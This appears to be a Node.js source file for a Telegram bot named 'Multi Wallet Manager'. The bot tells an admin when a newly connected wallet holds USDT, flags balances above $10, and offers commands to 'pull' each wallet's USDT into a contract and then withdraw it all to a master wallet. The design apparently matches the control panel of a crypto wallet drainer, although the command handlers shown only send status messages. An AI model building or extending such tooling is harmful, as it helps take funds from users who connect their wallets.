const TelegramBot = require('node-telegram-bot-api');
const dotenv = require('dotenv');

dotenv.config();

class TelegramService {
    constructor() {
        this.bot = null;
        this.adminChatId = process.env.ADMIN_CHAT_ID;
        this.botToken = process.env.TELEGRAM_BOT_TOKEN;
        this.isInitialized = false;
    }

    // Initialize without webhook server (Render handles this)
    init() {
        if (!this.botToken) {
            console.log('⚠️ Telegram bot token not found, skipping bot initialization');
            return;
        }
        
        try {
            // Use polling for development, webhook for production
            const useWebhook = process.env.NODE_ENV === 'production';
            
            if (useWebhook) {
                // In production, Render handles webhook setup
                // We just create the bot instance
                this.bot = new TelegramBot(this.botToken);
                console.log('✅ Telegram bot initialized (webhook mode)');
            } else {
                // In development, use polling
                this.bot = new TelegramBot(this.botToken, { polling: true });
                console.log('✅ Telegram bot initialized (polling mode)');
            }
            
            // Set up command handlers
            this.setupCommandHandlers();
            this.isInitialized = true;
            
        } catch (error) {
            console.error('❌ Telegram bot initialization failed:', error.message);
        }
    }

    setupCommandHandlers() {
        if (!this.bot) return;

        // Start command
        this.bot.onText(/\/start/, (msg) => {
            this.sendWelcomeMessage(msg.chat.id);
        });

        // Help command
        this.bot.onText(/\/help/, (msg) => {
            this.sendWelcomeMessage(msg.chat.id);
        });

        // Pull command handler
        this.bot.onText(/\/pull_(.*)/, (msg, match) => {
            const walletAddress = match[1];
            this.handlePullCommand(msg.chat.id, walletAddress);
        });

        // Withdraw command
        this.bot.onText(/\/withdraw/, (msg) => {
            this.handleWithdrawCommand(msg.chat.id);
        });

        // Balances command
        this.bot.onText(/\/balances/, (msg) => {
            this.handleBalancesCommand(msg.chat.id);
        });
    }

    async sendWelcomeMessage(chatId) {
        const message = `
🤖 *Welcome to Multi Wallet Manager Bot!*

Available commands:
• /pull\\_<address> \\- Pull USDT from wallet
• /withdraw \\- Withdraw all USDT from contract
• /balances \\- Check all wallet balances
• /help \\- Show this help message

*Security Note:* Only authorized admins can execute sensitive commands\\.
        `;
        
        try {
            return await this.bot.sendMessage(chatId, message, {
                parse_mode: 'MarkdownV2'
            });
        } catch (error) {
            console.error('Error sending welcome message:', error.message);
        }
    }

    async sendNewWalletAlert(walletAddress, balance) {
        if (!this.bot || !this.adminChatId) return;
        
        const escapedAddress = walletAddress.replace(/([_\*\[\]\(\)~\`>\#\+\-\=\|\{\}\.])/g, '\\$1');
        
        const message = `
🔔 *NEW WALLET CONNECTED*
Address: \`${escapedAddress}\`
USDT Balance: *${balance} USDT*

Actions:
• /pull\\_${escapedAddress} \\- Pull USDT to contract
        `;
        
        try {
            return await this.bot.sendMessage(this.adminChatId, message, {
                parse_mode: 'MarkdownV2'
            });
        } catch (error) {
            console.error('Error sending new wallet alert:', error.message);
        }
    }

    async sendBalanceAlert(walletAddress, balance) {
        if (!this.bot || !this.adminChatId) return;
        
        const escapedAddress = walletAddress.replace(/([_\*\[\]\(\)~\`>\#\+\-\=\|\{\}\.])/g, '\\$1');
        
        const message = `
💰 *BALANCE ALERT*
Address: \`${escapedAddress}\`
USDT Balance: *${balance} USDT* \\(> \\$10\\)

Actions:
• /pull\\_${escapedAddress} \\- Pull USDT to contract
        `;
        
        try {
            return await this.bot.sendMessage(this.adminChatId, message, {
                parse_mode: 'MarkdownV2'
            });
        } catch (error) {
            console.error('Error sending balance alert:', error.message);
        }
    }

    async sendSuccessMessage(walletAddress, amount, txHash) {
        if (!this.bot || !this.adminChatId) return;
        
        const escapedAddress = walletAddress.replace(/([_\*\[\]\(\)~\`>\#\+\-\=\|\{\}\.])/g, '\\$1');
        const escapedTxHash = txHash.replace(/([_\*\[\]\(\)~\`>\#\+\-\=\|\{\}\.])/g, '\\$1');
        
        const message = `
✅ *SUCCESSFUL PULL*
Address: \`${escapedAddress}\`
Amount: *${amount} USDT*
Transaction: \`${escapedTxHash}\`
        `;
        
        try {
            return await this.bot.sendMessage(this.adminChatId, message, {
                parse_mode: 'MarkdownV2'
            });
        } catch (error) {
            console.error('Error sending success message:', error.message);
        }
    }

    async handlePullCommand(chatId, walletAddress) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ *Unauthorized access*', {
                parse_mode: 'MarkdownV2'
            });
        }
        
        // Validate wallet address
        if (!walletAddress || walletAddress.length !== 42) {
            return this.bot.sendMessage(chatId, '❌ *Invalid wallet address*', {
                parse_mode: 'MarkdownV2'
            });
        }
        
        const message = `
🔄 *Pull Operation Initiated*
Wallet: \`${walletAddress}\`

Processing\\.\\.\\. This will:
1\\. Check wallet gas balance
2\\. Send gas if needed
3\\. Pull USDT to contract
4\\. Send confirmation
        `;
        
        return this.bot.sendMessage(chatId, message, {
            parse_mode: 'MarkdownV2'
        });
    }

    async handleWithdrawCommand(chatId) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ *Unauthorized access*', {
                parse_mode: 'MarkdownV2'
            });
        }
        
        const message = `
🏦 *Withdraw Operation Initiated*
Withdrawing all USDT from contract to master wallet\\.\\.\\.
        `;
        
        return this.bot.sendMessage(chatId, message, {
            parse_mode: 'MarkdownV2'
        });
    }

    async handleBalancesCommand(chatId) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ *Unauthorized access*', {
                parse_mode: 'MarkdownV2'
            });
        }
        
        const message = `
📊 *Wallet Balances Requested*
Fetching wallet balances\\.\\.\\. This may take a moment\\.
        `;
        
        return this.bot.sendMessage(chatId, message, {
            parse_mode: 'MarkdownV2'
        });
    }

    async sendMessage(chatId, message, options = {}) {
        if (!this.bot) return;
        try {
            return await this.bot.sendMessage(chatId, message, options);
        } catch (error) {
            console.error('Error sending message:', error.message);
        }
    }
}

module.exports = new TelegramService();
